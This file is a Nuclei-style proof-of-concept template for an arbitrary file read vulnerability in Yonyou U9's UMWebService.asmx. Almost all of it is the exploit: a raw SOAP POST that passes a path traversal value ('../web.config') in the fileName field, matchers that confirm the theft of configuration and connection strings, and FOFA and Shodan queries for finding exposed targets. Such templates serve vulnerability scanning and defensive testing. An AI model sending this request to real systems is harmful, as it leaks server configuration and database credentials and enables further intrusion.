poc/web/yonyou-u9-umwebservice-fileread.yaml

id: yonyou-u9-umwebservice-fileread

info:
  name: Yonyou U9 UMWebService.asmx Arbitrary File Read Vulnerability
  author: Co5mos
  severity: high
  description: |
    The UMWebService.asmx component in Yonyou U9 platform is an important part that provides Web service interfaces, allowing enterprises to access and invoke various functions and data of the Yonyou U9 platform via the Web. There is an arbitrary file read vulnerability in the UMWebService.asmx, which could allow attackers to retrieve sensitive files from the system by sending specific requests.
  reference:
    - https://blog.csdn.net/qq_67810151/article/details/136422614
  metadata:
    fofa-query: body="logo-u9.png"
    shodan-query: http.html:"logo-u9.png"
  tags: yonyou,fileread

http:
  - raw:
      - |
        POST /u9/OnLine/UMWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36
        Connection: close
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetLogContent"
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLogContent xmlns="http://tempuri.org/">
              <fileName>../web.config</fileName>
            </GetLogContent>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "configSections"
          - "appSettings"
          - "connectionStrings"
        condition: and

      - type: status
        status:
          - 200

